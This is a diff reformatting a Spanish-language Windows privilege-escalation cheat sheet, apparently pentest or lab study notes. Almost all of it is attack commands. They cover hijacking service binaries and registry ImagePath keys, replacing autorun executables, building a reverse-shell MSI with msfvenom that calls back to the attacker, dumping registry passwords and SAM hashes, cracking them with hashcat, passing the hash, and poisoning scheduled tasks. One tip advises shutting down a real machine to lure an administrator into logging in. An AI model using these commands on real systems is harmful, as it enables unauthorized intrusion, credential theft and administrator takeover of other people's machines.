@@ -131,129 +131,155 @@ ponemos un netcat en listener y corremos el servicio
 
         net start servicio
 
-##################### WEAK REGISTRY PERMISSIONS:
+### WEAK REGISTRY PERMISSIONS:
 
 Una vez identificado un servicio que corre con privilegios elevados, corremos el accesschk.exe para ver si nuestro user/grupo al que pertenece puede escribir entradas de registro:
-accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\servicio
+
+        accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\servicio
 
 De tenerlos, podemos reescribir el imagepath key para que apunte a un archivo malicioso:
-reg add HKLM\SYSTEM\CurrentControlSet\services\service /v ImagePath /t REG_EXPAND_SZ /d C:\Path\to/malicious.exe /f
+
+
+        reg add HKLM\SYSTEM\CurrentControlSet\services\service /v ImagePath /t REG_EXPAND_SZ /d C:\Path\to/malicious.exe /f
 
 Iniciamos un netcat como listener y corremos el servicio
-net start regsvc
 
-#################### INSECURE SERVICE EXECUTABLES
+        net start regsvc
+
+### INSECURE SERVICE EXECUTABLES
 
 Una vez que detectamos el servicio con privilegios elevados, nos fijamos con accesschk.exe si el binario del servicio es writeable por nuestro user/grupo.
-C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\servicio.exe"
+
+        C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\servicio.exe"
 
 De tener permisos de escritura sobre el archivo, podemos reemplazarlo por nuestro archivo malicioso:
-copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\servicio.exe" /Y
+
+        copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\servicio.exe" /Y
 
 Luego corremos netcat y corremos el servicio.
-net start servicio
+
+        net start servicio
 
 
 
-#########################################################################REGISTRY
+## REGISTRY EXPLOITATION
 
 
-################################### EXPLOIT AUTORUNS
+### EXPLOIT AUTORUNS
 
 Buscamos en el registro ejecutables de autoruns
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+        reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 
 usamos accesschk.exe para ver los permisos que tienen los autoruns
-accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\AUTORUN.exe"
+
+        accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\AUTORUN.exe"
 
 Si nuestro user/grupo tiene permisos de escritura sobre el autorun, lo reemplazamos por el archivo malicioso y reiniciamos la pc(en un entorno real es mejor apagarla para llamar la atención del admin y 
 que se loguee en la misma):
-copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+
+        copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
 
 abrimos netcat y esperamos a que alguien encienda la máquina y se loguee
 
 
-################################### ALWAYSINSTALLELEVATED 
+### ALWAYSINSTALLELEVATED 
 
 
 Hacemos una query al registro buscando las keys de Alwaysinstallelevated
 
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+
+        reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
 si en ambos casos las keys están seteadas en 1 (0x1 == true)
 
 generamos un archivo malicioso .msi con una shell reversa y lo pasamos a la víctima:
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=NUESTRA_IP LPORT=PUERTO -f msi -o reverse.msi
+
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=NUESTRA_IP LPORT=PUERTO -f msi -o reverse.msi
 
 lo instalamos y se nos va a generar una shell reversa con permisos de admin.
-msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+
+        msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 
 
 
-##################################################################################### PASSWORDS
+## PASSWORDS
 
-##########################REGISTRY
+### REGISTRY
 
 podemos buscar passwords en el registro de windows: 
 Usualmente, si están, se encuentran en el archivo winlogon. De esta forma podemos listarlo:
-reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+        reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
 
 De no estar ahí podemos expandir nuestra búsqueda listando archivos del registro que tengan la key o el value "password" y luego volver a listar cada uno con el comando anterior:
-reg query HKLM /f password /t REG_SZ /s
+
+        reg query HKLM /f password /t REG_SZ /s
 
 si encontramos la password podemos conectarnos desde kali con el winexe:
-winexe -U 'admin%password' //IP-VICTIMA cmd.exe
+
+        winexe -U 'admin%password' //IP-VICTIMA cmd.exe
 
 
-######################## SAVED CREDS
+### SAVED CREDS
 
 Podemos listar las credenciales guardadas en el sistema con el siguiente comando:
-cmdkey /list
+
+        cmdkey /list
 
 Si entre las credenciales guardadas aparecen las del admin(no vamos a ver la password) podemos correr nuestro binario malicioso como admin y tener una reverse shell:
-runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+
+        runas /savecred /user:admin C:\PrivEsc\reverse.exe
 
 
 
-########################## SAM
+### SAM
 
 Si podemos extraer el SAM y System (usualmente se encuentran en la carpeta windows/repair)
 
 podemos unirlos con creddump7 y extraer el hash, luego con hashcat podemos intentar romperlo:
 
-git clone https://github.com/Tib3rius/creddump7
-pip3 install pycrypto
-python3 creddump7/pwdump.py SYSTEM SAM
+        git clone https://github.com/Tib3rius/creddump7
+        pip3 install pycrypto
+        python3 creddump7/pwdump.py SYSTEM SAM
 
-hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+##### Luego las rompemos con hashcat
 
-########################## PASSING THE HASH
+        hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+
+###### PASSING THE HASH
 
 Si obtuvimos el hash pero no lo podemos romper, podemos loguearnos con el hash utilizando pth-winexe:
 
-pth-winexe -U 'admin%hash' //10.10.11.49 cmd.exe
+        pth-winexe -U 'admin%hash' //10.10.11.49 cmd.exe
 
 
-################################################################################### SCHEDULED TASKS
+### SCHEDULED TASKS
 
 Si encontramos un archivo que corre tareas programadas y tenemos capacidades de escritura en los mismos podemos agregegarle una ejecución a nuestro binario malicioso:
 
-accesschk.exe /accepteula -wvu "C:\PATH\To\file"
+        accesschk.exe /accepteula -wvu "C:\PATH\To\file"
 
-La ruta al archivo maliciosa debe ser absoluta!!!
-echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+##### La ruta al archivo maliciosa debe ser absoluta!!!
+
+        echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
 
 Esperamos con nuestro netcat a que se ejecute.
 
-################################################################################## INSECURE GUI APPS
+### INSECURE GUI APPS
 
 Si vemos que una app corre como administrador (para esto necesitamos tener un entorno gráfico) podemos usarla para correr un cmd con los mismos privilegios:
 
 Para ver con qué privilegios corre:
-tasklist /V | findstr binario_de_la_app.exe
 
-Abrimos la app y le damos open para cargar un archivo "X" y en el explorador de windows colocamos:  file://c:/windows/system32/cmd.exe (o el path al cmd.exe)
+        tasklist /V | findstr binario_de_la_app.exe
+
+Abrimos la app y le damos open para cargar un archivo "X" y en el explorador de windows colocamos:  
+
+        file://c:/windows/system32/cmd.exe (o el path al cmd.exe)
 
 
 
